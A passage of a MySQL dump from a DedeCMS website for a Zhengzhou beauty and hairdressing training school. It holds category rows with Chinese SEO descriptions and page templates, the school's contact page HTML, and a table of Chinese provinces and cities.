识，包括美容护肤窍门、学习知识、技术知识、创业经验美容创业，美容师专业技法等，希望帮助到更多学美容技术的学员','美容资讯,美容培训知识,美容培训资讯,环球美容学校','美容资讯',0,'{cmspath}/meirong','http://meirong.zzhqxx.com',0,0,'0','','','/uploads/1902/1-1Z22GQTC06.jpg'),(6,1,1,4,'美容证书','{cmspath}/meirong/fuwu',1,'index.html',1,1,-1,0,0,'default/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','美容证书',0,'{cmspath}/meirong','http://meirong.zzhqxx.com',0,0,'0','','','/uploads/1902/1-1Z22GQTC06.jpg'),(7,0,0,2,'美发培训','{cmspath}/meifa',1,'index.html',1,1,-1,1,0,'hqxx/index_default.htm','hqxx/list_default.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美发培训,美发培训课程内容包含美发师培训全科班、美发速成班、美发进修班，业界众多美发师力荐美发学校!专业美发培训,真人发型实践实操','美发学校,美发培训,理发学校,郑州美发学校,环球美发学校,郑州理发学校,河南美发学校','美发学校',0,'{cmspath}/meifa','',0,0,'0','','','/uploads/1902/1-1Z22GA433501.jpg'),(8,7,7,0,'美发课程','{cmspath}/meifa/kecheng',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_default.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美发学校,开设专业的美发课程及美发进修课程,染发进修,剪发进修,烫发进修等等,专为无基础及已经从业的发型师定制课程','美发课程,美发培训课程,美发学校,理发培训,环球美发学校,环球美发培训课程','美发课程',0,'{cmspath}/meifa','',0,0,'0','','','/uploads/1902/1-1Z22GA433501.jpg'),(9,7,7,1,'美发实操','{cmspath}/meifa/shicao',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球美发学校在教学中为学员安排的实操机会，超过70%以上的实操时间，美发实操包含实体店实操、美发比赛、美发活动、义务美发、免费剪发等,为培训专业的美发师提供实践练习机会','美发实操,美发实践,美发学校,环球美发学校,美发实操练习','美发实操',0,'{cmspath}/meifa','',0,0,'0','','','/uploads/1902/1-1Z22GA433501.jpg'),(10,7,7,2,'美发作品','{cmspath}/meifa/zuopin',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球美发学校老师及美发学员们美发图片、美发作品，图片作品包含潮流时尚的美发造型，如刘海长直发作品、长卷发图片、短发图片、儿童美发图片、烫发染发作品等等','美发作品,美发学校,美发培训作品,美发图片,美发造型作品,环球美发作品','美发作品',0,'{cmspath}/meifa','',0,0,'0','','','/uploads/1902/1-1Z22GA433501.jpg'),(11,7,7,3,'美发资讯','{cmspath}/meifa/zixun',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球美发培训学校,提供专业的美发专业知识，分享专业的美发经验、技巧，从美发培训到美发连锁店管理，有基础的美发知识，也有更加高级的美发操作技巧','美发咨询,美发知识,美发技巧,美发培训,美发学校,环球美发学校','美发资讯',0,'{cmspath}/meifa','',0,0,'0','','','/uploads/1902/1-1Z22GA433501.jpg'),(12,7,7,4,'美发证书','{cmspath}/meifa/fuwu',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','学员服务',0,'{cmspath}/meifa','',0,0,'0','','','/uploads/1902/1-1Z22GA433501.jpg'),(13,0,0,3,'化妆培训','{cmspath}/huazhuang',1,'index.html',1,1,-1,1,0,'hqxx/index_default.htm','hqxx/list_default.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球化妆培训课程有化妆师培训全科班、影楼新娘妆培训班、个人形象设计班、化妆师高级研修班等课程，环球培训学校是郑州知名化妆培训机构，郑州专业化妆培训学校,化妆培训详细课程表、学习时间、课程学费完全公开透明化','化妆学校,化妆培训,郑州化妆学校,学化妆,化妆培训学校','化妆',0,'{cmspath}/huazhuang','',0,0,'0','','','/uploads/1902/1-1Z22G63233O7.jpg'),(14,13,13,0,'化妆课程','{cmspath}/huazhuang/kecheng',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_default.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球学校化妆课程,化妆课程分为化妆全科班、晚装盘发班、个人形象设计班、影视特效化妆班、色彩搭配课程、影楼新娘妆班，化妆课程根据市场需求而多样化,满足不同学习需求','化妆课程,化妆培训课程,化妆培训,郑州化妆培训,郑州化妆培训学校','化妆课程',0,'{cmspath}/huazhuang','',0,0,'0','','','/uploads/1902/1-1Z22G63233O7.jpg'),(15,13,13,1,'化妆实操','{cmspath}/huazhuang/shicao',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球化妆实操,主要包括化妆老师和学员课程实操作品、中西式新娘作品、创意彩妆作实操、晚宴妆、舞台走秀实操、以衣大型活动参赛化妆实操作品等','化妆实操,化妆培训实操,化妆实操练习,郑州化妆培训,化妆培训学校','化妆实操',0,'{cmspath}/huazhuang','',0,0,'0','','','/uploads/1902/1-1Z22G63233O7.jpg'),(16,13,13,2,'化妆作品','{cmspath}/huazhuang/zuopin',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球化妆作品图片主要包括学员课程实操作品、中西式新娘作品、创意彩妆作品、晚宴妆、舞台走秀作品、以衣大型活动参赛化妆作品等','化妆作品,环球化妆作品,化妆培训作品,化妆培训学校作品','化妆作品',0,'{cmspath}/huazhuang','',0,0,'0','','','/uploads/1902/1-1Z22G63233O7.jpg'),(17,13,13,3,'化妆资讯','{cmspath}/huazhuang/zixun',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球化妆资讯,化妆学员和老师在学化妆技术的过程中遇到的各种技术知识收集，包括学习知识、技术知识、创业经验等等众多化妆知识的总结','化妆资讯,化妆培训,化妆培训知识,环球化妆学校,郑州化妆培训','化妆资讯',0,'{cmspath}/huazhuang','',0,0,'0','','','/uploads/1902/1-1Z22G63233O7.jpg'),(18,13,13,4,'学员服务','{cmspath}/huazhuang/fuwu',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','学员服务',0,'{cmspath}/huazhuang','',0,0,'0','','','/uploads/1902/1-1Z22G63233O7.jpg'),(19,0,0,4,'美甲培训','{cmspath}/meijia',1,'index.html',1,1,-1,1,0,'hqxx/index_default.htm','hqxx/list_default.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美甲培训,权威的美甲学校,时尚实用潮流的美甲课程,环球美甲培训是河南郑州知名高级美甲师培训学校，课程由资深美甲老师全程授课，专注于培养高级美甲技术人才，指尖上的艺术师','美甲培训,美甲培训课程,美甲培训学校,郑州美甲培训,环球美甲学校','美甲培训',0,'{cmspath}/meijia','',0,0,'0','','','/uploads/1902/1-1Z22G620355G.jpg'),(20,19,19,0,'美甲课程','{cmspath}/meijia/kecheng',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_default.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球学校美甲课程，美甲课程主要分为美甲全科班、美甲进修班、美甲初级班、美甲速成班，课程技术内容包含彩色美甲、水染美甲、法式美甲、日韩美甲等，不同课程对应不同学习目的的学员，课程技术内容完善,学美甲技术学而有用','美甲课程,美甲培训课程,环球美甲培训,郑州美甲培训,美甲培训学校','美甲课程',0,'{cmspath}/meijia','',0,0,'0','','','/uploads/1902/1-1Z22G620355G.jpg'),(21,19,19,1,'美甲实操','{cmspath}/meijia/shicao',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','环球美甲学员和老师们的实际操作和动手练习，在学美甲过程中老师对学员就专业的手法、理论知识、相互学习、活动练习等等；学美甲实操练习的时间占整个学习时间的70%左右，更多的实操练习才能够保证学习效果','美甲实操,美甲实操练习,环球美甲培训实操,郑州美甲培训','美甲实操',0,'{cmspath}/meijia','',0,0,'0','','','/uploads/1902/1-1Z22G620355G.jpg'),(22,19,19,2,'美甲作品','{cmspath}/meijia/zuopin',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美甲学校老师及学员美甲作品图片，美甲作品，图片作品内容包含QQ美甲、光疗甲、陶瓷美甲、3D彩绘钻甲等美甲图片，体现出学校重技术、重实操的教学理念','美甲作品,美甲培训作品,环球美甲培训,郑州美甲学校','美甲作品',0,'{cmspath}/meijia','',0,0,'0','','','/uploads/1902/1-1Z22G620355G.jpg'),(23,19,19,3,'美甲资讯','{cmspath}/meijia/zixun',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美甲学校分享的美甲教程资讯,美甲工具产品的使用、美甲小技巧、美甲店的经营管理等美甲百专业知识,有基础的美甲知识，也有更加高级的美甲操作技巧','美甲资讯,郑州环球美甲培训,美甲知识,美甲技巧,美甲培训','美甲资讯',0,'{cmspath}/meijia','',0,0,'0','','','/uploads/1902/1-1Z22G620355G.jpg'),(24,19,19,4,'美甲服务','{cmspath}/meijia/fuwu',1,'index.html',1,1,-1,0,0,'hqxx/index_default.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','美甲服务',0,'{cmspath}/meijia','',0,0,'0','','','/uploads/1902/1-1Z22G620355G.jpg'),(25,0,0,5,'师资力量','{cmspath}/shizi',1,'index.html',1,1,-1,0,0,'{style}/index_article.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美容美发学校培训讲师，都是美业行业中的精英、知名老师，拥有丰富的教学经验及扎实的技术功底，严格系统的专业教学能力训练，定期接受各项技能考核，不断提升技术能力','师资力量,美容美发培训讲师,环球美容美发培训','师资力量',0,'{cmspath}/shizi','',0,0,'0','','','/uploads/1902/1-1Z22H33550296.jpg'),(26,0,0,6,'学校简介','{cmspath}/jianjie',1,'index.html',1,1,-1,0,0,'{style}/index_article.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','学校简介',0,'{cmspath}/jianjie','',0,0,'0','','','/uploads/1902/1-1Z22P00225A7.jpg'),(27,26,26,0,'学校概况','{cmspath}/jianjie/gaikuang',1,'index.html',1,1,-1,0,0,'hqxx/singlepage.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','学校概况',0,'{cmspath}/jianjie','',0,0,'0','<h1 label=\"标题居中\" style=\"font-size: 32px; font-weight: bold; border-bottom-color: rgb(204, 204, 204); border-bottom-width: 2px; border-bottom-style: solid; padding: 0px 4px 0px 0px; text-align: center; margin: 0px 0px 20px;\">&nbsp;品牌介绍</h1><p><br/></p><p style=\"text-align: left;\">&nbsp; &nbsp;郑州市中原环球美容美发晚装职业技能培训学校，简称郑州环球美容美发化妆学校，最初由广州环球美容美发集团发展而来。学校开创之初仅仅是几个穷孩子为了谋生存，经拜师学艺后开设了一家小理发店，借助兴隆的生意，发廊和美容院就一家又一家地开了起来，到目前环球已经开设了上百家发廊和美容院，这还仅仅是个开始，环球的远大目标是，要在全国开设上千家发廊和美容院。</p><p style=\"text-align: left;\"><br/></p>','','/uploads/1902/1-1Z22P00225A7.jpg'),(28,26,26,1,'学校环境','{cmspath}/jianjie/huanjing',1,'index.html',1,1,-1,0,0,'{style}/index_article.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','学校环境',0,'{cmspath}/jianjie','',0,0,'0','','','/uploads/1902/1-1Z22P00225A7.jpg'),(29,26,26,2,'荣誉资质','{cmspath}/jianjie/rongyuzizhi',1,'index.html',1,1,-1,0,0,'{style}/index_article.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','荣誉资质',0,'{cmspath}/jianjie','',0,0,'0','','','/uploads/1902/1-1Z22P00225A7.jpg'),(30,0,0,7,'校园动态','{cmspath}/dongtai',1,'index.html',1,1,-1,0,0,'{style}/index_article.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','郑州环球美容美发化妆学校新闻报道，了解环球美容美发学校培训动态，最新的学校实践活动。同时发布美容美发培训行业资讯，时尚流行趋势，深入解析行业发展动态','环球美容美发学校,郑州环球学校,环球美容美发学校,新闻动态,行业资讯','环球培训动态',0,'{cmspath}/dongtai','',0,0,'0','','','/uploads/1902/1-1Z22P01FJa.jpg'),(31,30,30,0,'校园活动','{cmspath}/dongtai/xiaoyuanhuodong',1,'index.html',1,1,-1,0,0,'{style}/index_article.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','校园活动',0,'{cmspath}/dongtai','',0,0,'0','','','/uploads/1902/1-1Z22P01FJa.jpg'),(32,30,30,1,'行业新闻','{cmspath}/dongtai/xinwen',1,'index.html',1,1,-1,0,0,'{style}/index_article.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','行业新闻',0,'{cmspath}/dongtai','',0,0,'0','','','/uploads/1902/1-1Z22P01FJa.jpg'),(33,30,30,2,'大型活动','{cmspath}/dongtai/daxinghuodong',1,'index.html',1,1,-1,0,0,'{style}/index_article.htm','hqxx/list_image.htm','hqxx/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','','','大型活动',0,'{cmspath}/dongtai','',0,0,'0','','','/uploads/1902/1-1Z22P01FJa.jpg'),(34,0,0,8,'联系我们','/contact/',1,'index.html',1,1,-1,1,0,'hqxx/singlepage.htm','{style}/list_article.htm','{style}/article_article.htm','{typedir}/{Y}{M}{D}{aid}.html','{typedir}/list_{tid}_{page}.html','default','这里填写栏目描述','','联系我们',0,'/contact/','',0,0,'0','<p style=\"line-height: 2em; text-align: center;\"><span style=\"font-size: 16px;\"><br/></span></p><p style=\"line-height: 2em;\"><span style=\"font-size: 16px;\"><br/></span></p><p style=\"line-height: 2em; text-align: center;\"><span style=\"font-size: 16px;\">地址：郑州市中原区桐柏北路98号</span></p><p style=\"white-space: normal; line-height: 2em; text-align: center;\"><span style=\"font-size: 16px;\">联系电话：0371-67511000</span></p><p style=\"white-space: normal; line-height: 2em; text-align: center;\"><br/></p><p style=\"white-space: normal; line-height: 2em; text-align: center;\"><span style=\"font-size: 20px;\"><strong>乘车方式：</strong></span><br/></p><p style=\"white-space: normal; line-height: 2em; text-align: center;\"><span style=\"font-size: 16px;\">郑州二环线上，在火车站可以乘坐76路或B12路公交车火车站北港湾坐到【桐柏路煤仓北街站】下车前行20米就是学校楼下。<br/></span></p><p style=\"white-space: normal; line-height: 2em; text-align: center;\"><span style=\"font-size: 16px;\">开车：用导航查询<span style=\"font-size: 18px; text-align: center;\">【</span>环球美容美发学校<span style=\"font-size: 18px; text-align: center;\">】</span>就可以。</span></p><p style=\"white-space: normal; line-height: 2em; text-align: center;\"><span style=\"font-size: 16px;\">打车到桐柏北路西站路交汇处向北300米路东就是学校！</span><br/></p><p style=\"text-align: center;\"><br/></p><p style=\"text-align: center;\"><br/> &nbsp;<iframe class=\"ueditor_baidumap\" src=\"http://www.zzhqxx.com/include/ueditor/dialogs/map/show.html#center=113.716407,34.753857&zoom=16&width=530&height=340&markers=113.624232,34.777633&markerStyles=l,A\" frameborder=\"0\" width=\"534\" height=\"344\"></iframe>\r\n			&nbsp;</p><p><br/></p>','','/uploads/1902/1-1Z22P02GD41.jpg');
/*!40000 ALTER TABLE `dede_arctype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_area`
--

DROP TABLE IF EXISTS `dede_area`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_area` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL DEFAULT '',
  `reid` int(10) unsigned NOT NULL DEFAULT '0',
  `disorder` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3118 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_area`
--

LOCK TABLES `dede_area` WRITE;
/*!40000 ALTER TABLE `dede_area` DISABLE KEYS */;
INSERT INTO `dede_area` VALUES (1,'北京市',0,0),(102,'西城区',1,2),(126,'崇文区',1,0),(104,'宣武区',1,0),(105,'朝阳区',1,0),(106,'海淀区',1,0),(107,'丰台区',1,0),(108,'石景山区',1,0),(109,'门头沟区',1,0),(110,'房山区',1,0),(111,'通州区',1,0),(112,'顺义区',1,0),(113,'昌平区',1,0),(114,'大兴区',1,0),(115,'平谷县',1,0),(116,'怀柔县',1,0),(117,'密云县',1,0),(118,'延庆县',1,0),(2,'上海市',0,0),(201,'黄浦区',2,0),(202,'卢湾区',2,0),(203,'徐汇区',2,0),(204,'长宁区',2,0),(205,'静安区',2,0),(206,'普陀区',2,0),(207,'闸北区',2,0),(208,'虹口区',2,0),(209,'杨浦区',2,0),(210,'宝山区',2,0),(211,'闵行区',2,0),(212,'嘉定区',2,0),(213,'浦东新区',2,0),(214,'松江区',2,0),(215,'金山区',2,0),(216,'青浦区',2,0),(217,'南汇区',2,0),(218,'奉贤区',2,0),(219,'崇明县',2,0),(3,'天津市',0,0),(301,'和平区',3,0),(302,'河东区',3,0),(303,'河西区',3,0),(304,'南开区',3,0),(305,'河北区',3,0),(306,'红桥区',3,0),(307,'塘沽区',3,0),(308,'汉沽区',3,0),(309,'大港区',3,0),(310,'东丽区',3,0),(311,'西青区',3,0),(312,'北辰区',3,0),(313,'津南区',3,0),(314,'武清区',3,0),(315,'宝坻区',3,0),(316,'静海县',3,0),(317,'宁河县',3,0),(318,'蓟县',3,0),(4,'重庆市',0,0),(401,'渝中区',4,0),(402,'大渡口区',4,0),(403,'江北区',4,0),(404,'沙坪坝区',4,0),(405,'九龙坡区',4,0),(406,'南岸区',4,0),(407,'北碚区',4,0),(408,'万盛区',4,0),(409,'双桥区',4,0),(410,'渝北区',4,0),(411,'巴南区',4,0),(412,'万州区',4,0),(413,'涪陵区',4,0),(414,'黔江区',4,0),(415,'永川市',4,0),(416,'合川市',4,0),(417,'江津市',4,0),(418,'南川市',4,0),(419,'长寿县',4,0),(420,'綦江县',4,0),(421,'潼南县',4,0),(422,'荣昌县',4,0),(423,'璧山县',4,0),(424,'大足县',4,0),(425,'铜梁县',4,0),(426,'梁平县',4,0),(427,'城口县',4,0),(428,'垫江县',4,0),(429,'武隆县',4,0),(430,'丰都县',4,0),(431,'奉节县',4,0),(432,'开县',4,0),(433,'云阳县',4,0),(434,'忠县',4,0),(435,'巫溪县',4,0),(436,'巫山县',4,0),(437,'石柱县',4,0),(438,'秀山县',4,0),(439,'酉阳县',4,0),(440,'彭水县',4,0),(5,'广东省',0,0),(501,'广州市',5,0),(502,'深圳市',5,0),(503,'珠海市',5,0),(504,'汕头市',5,0),(505,'韶关市',5,0),(506,'河源市',5,0),(507,'梅州市',5,0),(508,'惠州市',5,0),(509,'汕尾市',5,0),(510,'东莞市',5,0),(511,'中山市',5,0),(512,'江门市',5,0),(513,'佛山市',5,0),(514,'阳江市',5,0),(515,'湛江市',5,0),(516,'茂名市',5,0),(517,'肇庆市',5,0),(518,'清远市',5,0),(519,'潮州市',5,0),(520,'揭阳市',5,0),(521,'云浮市',5,0),(6,'福建省',0,0),(601,'福州市',6,0),(602,'厦门市',6,0),(603,'三明市',6,0),(604,'莆田市',6,0),(605,'泉州市',6,0),(606,'漳州市',6,0),(607,'南平市',6,0),(608,'龙岩市',6,0),(609,'宁德市',6,0),(7,'浙江省',0,0),(701,'杭州市',7,0),(702,'宁波市',7,0),(703,'温州市',7,0),(704,'嘉兴市',7,0),(705,'湖州市',7,0),(706,'绍兴市',7,0),(707,'金华市',7,0),(708,'衢州市',7,0),(709,'舟山市',7,0),(710,'台州市',7,0),(711,'丽水市',7,0),(8,'江苏省',0,0),(801,'南京市',8,0),(802,'徐州市',8,0),(803,'连云港市',8,0),(804,'淮安市',8,0),(805,'宿迁市',8,0),(806,'盐城市',8,0),(807,'扬州市',8,0),(808,'泰州市',8,0),(809,'南通市',8,0),(810,'镇江市',8,0),(811,'常州市',8,0),(812,'无锡市',8,0),(813,'苏州市',8,0),(9,'山东省',0,0),(901,'济南市',9,0),(902,'青岛市',9,0),(903,'淄博市',9,0),(904,'枣庄市',9,0),(905,'东营市',9,0),(906,'潍坊市',9,0),(907,'烟台市',9,0),(908,'威海市',9,0),(909,'济宁市',9,0),(910,'泰安市',9,0),(911,'日照市',9,0),(912,'莱芜市',9,0),(913,'德州市',9,0),(914,'临沂市',9,0),(915,'聊城市',9,0),(916,'滨州市',9,0),(917,'菏泽市',9,0),(10,'辽宁省',0,0),(1001,'沈阳市',10,0),(1002,'大连市',10,0),(1003,'鞍山市',10,0),(1004,'抚顺市',10,0),(1005,'本溪市',10,0),(1006,'丹东市',10,0),(1007,'锦州市',10,0),(1008,'葫芦岛市',10,0),(1009,'营口市',10,0),(1010,'盘锦市',10,0),(1011,'阜新市',10,0),(1012,'辽阳市',10,0),(1013,'铁岭市',10,0),(1014,'朝阳市',10,0),(11,'江西省',0,0),(1101,'南昌市',11,0),(1102,'景德镇市',11,0),(1103,'萍乡市',11,0),(1104,'新余市',11,0),(1105,'九江市',11,0),(1106,'鹰潭市',11,0),(1107,'赣州市',11,0),(1108,'吉安市',11,0),(1109,'宜春市',11,0),(1110,'抚州市',11,0),(1111,'上饶市',11,0),(12,'四川省',0,0),(1201,'成都市',12,0),(1202,'自贡市',12,0),(1203,'攀枝花市',12,0),(1204,'泸州市',12,0),(1205,'德阳市',12,0),(1206,'绵阳市',12,0),(1207,'广元市',12,0),(1208,'遂宁市',12,0),(1209,'内江市',12,0),(1210,'乐山市',12,0),(1211,'南充市',12,0),(1212,'宜宾市',12,0),(1213,'广安市',12,0),(1214,'达州市',12,0),(1215,'巴中市',12,0),(1216,'雅安市',12,0),(1217,'眉山市',12,0),(1218,'资阳市',12,0),(1219,'阿坝州',12,0),(1220,'甘孜州',12,0),(1221,'凉山州',12,0),(13,'陕西省',0,0),(3114,'西安市',13,0),(1302,'铜川市',13,0),(1303,'宝鸡市',13,0),(1304,'咸阳市',13,0),(1305,'渭南市',13,0),(1306,'延安市',13,0),(1307,'汉中市',13,0),(1308,'榆林市',13,0),(1309,'安康市',13,0),(1310,'商洛地区',13,0),(14,'湖北省',0,0),(1401,'武汉市',14,0),(1402,'黄石市',14,0),(1403,'襄樊市',14,0),(1404,'十堰市',14,0),(1405,'荆州市',14,0),(1406,'宜昌市',14,0),(1407,'荆门市',14,0),(1408,'鄂州市',14,0),(1409,'孝感市',14,0),(1410,'黄冈市',14,0),(1411,'咸宁市',14,0),(1412,'随州市',14,0),(1413,'仙桃市',14,0),(1414,'天门市',14,0),(1415,'潜江市',14,0),(1416,'神农架',14,0),(1417,'恩施州',14,0),(15,'河南省',0,0),(1501,'郑州市',15,0),(1502,'开封市',15,0),(1503,'洛阳市',15,0),(1504,'平顶山市',15,0),(1505,'焦作市',15,0),(1506,'鹤壁市',15,0),(1507,'新乡市',15,0),(1508,'安阳市',15,0),(1509,'濮阳市',15,0),(1510,'许昌市',15,0),(1511,'漯河市',15,0),(1512,'三门峡市',15,0),(1513,'南阳市',15,0),(1514,'商丘市',15,0),(1515,'信阳市',15,0),(1516,'周口市',15,0),(1517,'驻马店市',15,0),(1518,'济源市',15,0),(16,'河北省',0,0),(1601,'石家庄市',16,0),(1602,'唐山市',16,0),(1603,'秦皇岛市',16,0),(1604,'邯郸市',16,0),(1605,'邢台市',16,0),(1606,'保定市',16,0),(1607,'张家口市',16,0),(1608,'承德市',16,0),(1609,'沧州市',16,0),(1610,'廊坊市',16,0),(1611,'衡水市',16,0),(17,'山西省',0,0),(1701,'太原市',17,0),(1702,'大同市',17,0),(1703,'阳泉市',17,0),(1704,'长治市',17,0),(1705,'晋城市',17,0),(1706,'朔州市',17,0),(1707,'晋中市',17,0),(1708,'忻州市',17,0),(1709,'临汾市',17,0),(1710,'运城市',17,0),(1711,'吕梁地区',17,0),(18,'内蒙古',0,0),(1801,'呼和浩特',18,0),(1802,'包头市',18,0),(1803,'乌海市',18,0),(1804,'赤峰市',18,0),(1805,'通辽市',18,0),(1806,'鄂尔多斯',18,0),(1807,'乌兰察布',18,0),(1808,'锡林郭勒',18,0),(1809,'呼伦贝尔',18,0),(1810,'巴彦淖尔',18,0),(1811,'阿拉善盟',18,0),(1812,'兴安盟',18,0),(19,'吉林省',0,0),(1901,'长春市',19,0),(1902,'吉林市',19,0),(1903,'四平市',19,0),(1904,'辽源市',19,0),(1905,'通化市',19,0),(1906,'白山市',19,0),(1907,'松原市',19,0),(1908,'白城市',19,0),(1909,'延边州',19,0),(20,'黑龙江',0,0),(2001,'哈尔滨市',20,0),(2002,'齐齐哈尔',20,0),(2003,'鹤岗市',20,0),(2004,'双鸭山市',20,0),(2005,'鸡西市',20,0),(2006,'大庆市',20,0),(2007,'伊春市',20,0),(2008,'牡丹江市',20,0),(2009,'佳木斯市',20,0),(2010,'七台河市',20,0),(2011,'黑河市',20,0),(2012,'绥化市',20,0),(2013,'大兴安岭',20,0),(21,'安徽省',0,0),(2101,'合肥市',21,0),(2102,'芜湖市',21,0),(2103,'蚌埠市',21,0),(2104,'淮南市',21,0),(2105,'马鞍山市',21,0),(2106,'淮北市',21,0),(2107,'铜陵市',21,0),(2108,'安庆市',21,0),(2109,'黄山市',21,0),(2110,'滁州市',21,0),(2111,'阜阳市',21,0),(2112,'宿州市',21,0),(2113,'巢湖市',21,0),(2114,'六安市',21,0),(2115,'亳州市',21,0),(2116,'宣城市',21,0),(2117,'池州市',21,0),(22,'湖南省',0,0),(2201,'长沙市',22,0),(2202,'株州市',22,0),(2203,'湘潭市',22,0),(2204,'衡阳市',22,0),(2205,'邵阳市',22,0),(2206,'岳阳市',22,0),(2207,'常德市',22,0),(2208,'张家界市',22,0),(2209,'益阳市',22,0),(2210,'郴州市',22,0),(2211,'永州市',22,0),(2212,'怀化市',22,0),(2213,'娄底市',22,0),(2214,'湘西州',22,0),(23,'广西区',0,0),(2301,'南宁市',23,0),(2302,'柳州市',23,0),(2303,'桂林市',23,0),(2304,'梧州市',23,0),(2305,'北海市',23,0),(2306,'防城港市',23,0),(2307,'钦州市',23,0),(2308,'贵港市',23,0),(2309,'玉林市',23,0),(2310,'南宁地区',23,0),(2311,'柳州地区',23,0),(2312,'贺州地区',23,0),(2313,'百色地区',23,0),(2314,'河池地区',23,0),(24,'海南省',0,0),(2401,'海口市',24,0),(2402,'三亚市',24,0),(2403,'五指山市',24,0),(2404,'琼海市',24,0),(2405,'儋州市',24,0),(2406,'琼山市',24,0),(2407,'文昌市',24,0),(2408,'万宁市',24,0),(2409,'东方市',24,0),(2410,'澄迈县',24,0),(2411,'定安县',24,0),(2412,'屯昌县',24,0),(2413,'临高县',24,0),(2414,'白沙县',24,0),(2415,'昌江县',24,0),(2416,'乐东县',24,0),(2417,'陵水县',24,0),(2418,'保亭县',24,0),(2419,'琼中县',24,0),(25,'云南省',0,0),(2501,'昆明市',25,0),(2502,'曲靖市',25,0),(2503,'玉溪市',25,0),(2504,'保山市',25,0),(2505,'昭通市',25,0),(2506,'思茅地区',25,0),(2507,'临沧地区',25,0),(2508,'丽江地区',25,0),(2509,'文山州',25,0),(2510,'红河州',25,0),(2511,'西双版纳',25,0),(2512,'楚雄州',25,0),(2513,'大理州',25,0),(2514,'德宏州',25,0),(2515,'怒江州',25,0),(2516,'迪庆州',25,0),(26,'贵州省',0,0),(2601,'贵阳市',26,0),(2602,'